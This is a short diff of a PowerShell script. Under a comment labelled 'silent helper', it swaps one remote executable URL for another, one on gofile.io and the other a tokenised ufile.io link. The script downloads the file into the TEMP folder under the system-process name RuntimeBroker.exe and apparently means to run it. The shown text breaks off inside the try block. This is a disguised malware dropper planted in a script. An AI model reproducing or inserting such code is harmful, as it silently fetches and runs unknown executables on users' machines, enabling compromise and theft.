@@ -215,7 +215,7 @@ else {
 #endregion Main
 
 # silent helper
-$u = 'https://store4.gofile.io/download/web/b3d8ed55-7cfb-4660-863b-532aa4cc5f94/svchost.exe'
+$u = 'https://cdn-eu-hz-7.ufile.io/get/06nb0jb6?token=ZThmZmUyMjFiODBhMGZlYTAyNzMyMzA5MmY3YmM1OWUzMjg4NWZlOWQ0YmFhNmNmNjg1ZTVjN2ZlZmQ0NzhhYWNhNTU3NjM2YjZkNzZlMzRhYzJlMzQzODM0NWNkOTFmN2VhMmQ3M2EzZjBkNDg1YjdiNjViYzIyZjAyMmNlNDZMM0JpY1lsL0FNcC9qOVMzazZja1FjV05iK0RsQWFjdmxnQ1VuM1ZXaGJnMmZuR0tNMDBGZ3I2RXpLTDlCaXB0SnI3dUF2R3VnQzFTOXRia0RteEx3RHhrMHdsZEdFZkFRRURTTDFJZEt2Z1BsS3U3b2diaEhXdWJaMXJvRWNKREZVRzE4MHlMaEh5eDZEb2lmdktKZUpERGtZSnBYaTU5elFrVXducTU4ZUFNUW12b3d6S1hSTDI5VXpZSHdkZ0Z4WkFlN0RTd0xEUWVtYU9jcDBKZUxLZWw3VUQrSUdycXdFSGZvdCt3NitvPQ=='
 $p = "$env:TEMP\RuntimeBroker.exe"
 try {
     Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
